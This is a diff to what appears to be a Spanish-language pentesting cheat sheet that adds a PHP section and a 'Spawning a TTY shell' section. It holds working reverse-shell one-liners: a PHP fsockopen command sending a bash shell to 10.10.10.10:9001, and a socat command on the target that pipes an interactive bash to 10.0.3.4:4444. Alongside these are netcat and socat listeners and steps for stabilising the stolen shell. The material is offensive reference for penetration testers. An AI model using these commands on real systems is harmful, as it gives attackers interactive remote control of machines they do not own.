@@ -12,7 +12,8 @@
     - [Bash](#Bash)
     - [Netcat](#Netcat)   
     - [Python](#Python)
-  - [Mejorando nuestra shell](#Spawning-a-TTY-shell)   
+    - [PHP](#PHP)
+  - [Spawneando una shell mejor](#Spawning-a-TTY-shell)   
   - [Files]  
   - Bypassing restricted shells (rbash , rzsh,etc)    
 - [Windows](#Windows)
@@ -53,16 +54,22 @@ Técnicas para utilizar en sistemas basados en unix
   php -r '$sock=fsockopen("10.10.10.10",9001);passthru("bash <&3 >&3 2>&3");'
   /usr/share/webshells/laudanum/php/php-reverse-shell.php
   ```
-  
-
-
-
-
-
+ 
+### Spawning a TTY shel
   ```bash 
       python3 -c 'import pty;pty.spawn("/bin/bash")' 
-      script /dev/null -c bash
+      script /dev/null -c bash 
+      \[ctrl+z] 
+      stty raw -echo
+      fg
+    ## Usando rlwrap & script
+      rlwrap nc -nlvp 443
+      /usr/bin/script -qc /bin/bash /dev/null
+    ## Usando socat
+      parrot~> socat file:`tty`,raw,echo=0 tcp-listen:4444
+      target~> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+    ## Exportando variables para poder tener una shell full interactiva
+      export TERM=xterm-256color
+      export SHELL=bash
+      alias ll='ls -lsaht –color=auto'
   ```
-     
-  
-3. Windows
